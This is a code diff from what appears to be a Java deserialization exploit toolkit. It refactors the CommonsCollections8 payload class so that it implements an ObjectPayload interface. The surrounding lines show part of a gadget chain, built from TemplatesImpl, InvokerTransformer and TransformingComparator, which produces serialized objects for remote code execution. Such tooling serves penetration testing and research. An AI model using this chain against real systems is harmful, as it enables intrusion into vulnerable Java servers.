@@ -12,10 +12,10 @@ import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.Comparator;
 
-public class CommonsCollections8 {
+public class CommonsCollections8 implements ObjectPayload<TreeBag>{
 
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object           tpl         = Gadgets.createTemplatesImpl(type, param);
         InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
@@ -30,5 +30,10 @@ public class CommonsCollections8 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public TreeBag getObject(String command) throws Exception {
+        return null;
     }
 }
